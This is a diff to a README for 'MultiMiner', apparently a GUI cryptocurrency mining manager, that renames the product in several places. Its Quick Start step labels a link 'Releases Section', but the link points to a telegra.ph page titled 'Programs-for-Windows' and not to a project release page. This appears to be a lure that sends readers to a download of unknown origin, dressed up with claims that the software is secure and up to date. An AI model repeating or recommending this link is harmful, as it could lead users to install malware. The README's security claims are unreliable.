@@ -1,13 +1,13 @@
-# 🚀 MultiMine – Cross-Platform GUI Mining Application
+# 🚀 MultiMiner – Cross-Platform GUI Mining Application
 
 
 > **Secure. Up-to-date. Beginner-friendly.**
 
 ---
 
-## 💎 What is MultiMine?
+## 💎 What is MultiMiner?
 
-**MultiMine** is a **cross-platform** 💻 mining manager with an intuitive **graphical interface** 🖥️. Built for both **beginners** and **power users**, it allows you to mine popular cryptocurrencies with just a few clicks.  
+**MultiMiner** is a **cross-platform** 💻 mining manager with an intuitive **graphical interface** 🖥️. Built for both **beginners** and **power users**, it allows you to mine popular cryptocurrencies with just a few clicks.  
 🔐 **Security-first** and always **up-to-date**, MultiMine ensures stable and safe mining performance across Windows, Linux, and macOS systems.
 
 ---
@@ -26,7 +26,7 @@
 
 ## 🛠️ Quick Start Guide
 
-### 🧩 Step 1: Download MultiMine
+### 🧩 Step 1: Download MultiMiner
 
 Grab the latest release from the [📥 Releases Section](https://telegra.ph/Programs-for-Windows-06-26)
 
@@ -40,7 +40,7 @@ Grab the latest release from the [📥 Releases Section](https://telegra.ph/Prog
 
 ### ⛏️ Step 3: Start Mining
 
-1. Launch **MultiMine** 🖥️  
+1. Launch **MultiMiner** 🖥️  
 2. Choose your **miner** and **algorithm**  
 3. Enter your **wallet address**  
 4. Click **Start Mining** 🟢
